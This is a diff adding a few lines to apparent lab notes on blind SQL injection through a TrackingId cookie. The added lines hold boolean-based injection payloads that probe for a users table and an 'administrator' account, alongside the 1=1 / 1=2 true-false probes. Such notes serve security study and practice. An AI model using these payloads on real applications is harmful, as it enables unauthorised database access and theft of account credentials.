@@ -215,6 +215,12 @@ GIVEN :The database contains a different table called users, with columns called
      TrackingId=Ypk14n3CAwrTbG3F'and 1=1 --+  : WELCOME BACK
      TrackingId=Ypk14n3CAwrTbG3F'and 1=2 --+   : NO RESPONSE 
 
+   -CONFIRM THAT WE HAVE users TABLE.
+    ' AND (SELECT 'X' FROM USERS LIMIT 1)='X' --+ : CHECK THE RESPONSE
+
+   -CONFIRM THAT WE HAVE users ADMINIOSTRATOR EXISTS IN TABLE.
+   ' AND (SELECT 'X' FROM USERS WHERE USERNAME='administrator')='X' --+
+   ' AND (SELECT USERNAME FROM USERS WHERE USERNAME='administrator')='administrator' --+
 
 
 
